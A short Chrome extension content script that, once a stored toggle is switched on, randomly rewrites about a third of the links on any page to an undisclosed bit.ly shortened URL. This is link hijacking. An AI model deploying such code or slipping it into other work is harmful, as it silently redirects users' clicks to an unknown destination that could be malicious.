
console.log("extension works!");
var a = document.getElementsByTagName("a");
console.log(localStorage.getItem("on"));
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
  	alert("Extension is " + request.greeting);
    if (request.greeting == "on") {
    	localStorage.setItem("on", "on");
    }
    else{
    	localStorage.setItem("on", "off");
    }
    location.reload();
  });
if (localStorage.getItem("on") == "on") {
	for (var i = 0; i < a.length; i++) {
		var random = Math.floor((Math.random() * 3) + 1);
		if (random == 2) {
			a[i].href = "http://bit.ly/30QqsQ2";
		}
	}
}
